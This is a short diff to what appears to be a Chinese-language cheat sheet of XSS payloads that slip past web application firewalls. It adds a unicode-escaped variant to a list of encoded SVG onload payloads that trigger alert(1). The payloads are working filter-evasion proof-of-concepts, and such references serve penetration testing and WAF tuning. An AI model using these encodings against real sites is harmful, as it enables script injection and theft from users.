@@ -248,6 +248,7 @@
   alert(1)编码，即可轻松绕过waf
   ```html
   <svg/onload=setTimeout('\141\154\145\162\164\50\61\51')>
+  <svg/onload=\u0073etTimeout('\141\154\145\162\164\50\61\51')>
   <svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>
   <svg/onload=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>
   ```
